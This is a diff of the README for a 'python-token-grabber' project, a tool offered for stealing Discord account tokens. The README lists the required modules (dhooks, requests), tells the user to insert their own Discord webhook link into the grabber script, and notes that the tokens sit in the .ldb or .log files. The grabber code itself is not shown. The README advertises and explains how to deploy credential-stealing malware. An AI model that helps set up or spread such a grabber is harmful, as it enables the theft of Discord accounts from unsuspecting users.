@@ -1,9 +1,11 @@
-# python-token-grabber
+# Python-token-grabber
 
-Neat little grabber
+Neat little grabber for Discord.
 
-Needs Modules: dhooks and requests
+---
+## Modules Needed
+ 1. dhooks 
+ 2. requests
 
-To Function it needs a Webhook Link on your discord server, and the link put in: ('WEBHOOK_LINK_HERE')
-
-And that's it. Token should be in one of the .ldb files or the .log file.
+It needs a Webhook Link on your discord server to work. Put the link in [('WEBHOOK HERE')](https://github.com/DeadBread76/python-token-grabber/blob/master/Token%20Grabber.py) 
+And that's it. Token should be in one of the .ldb files or in the .log file.
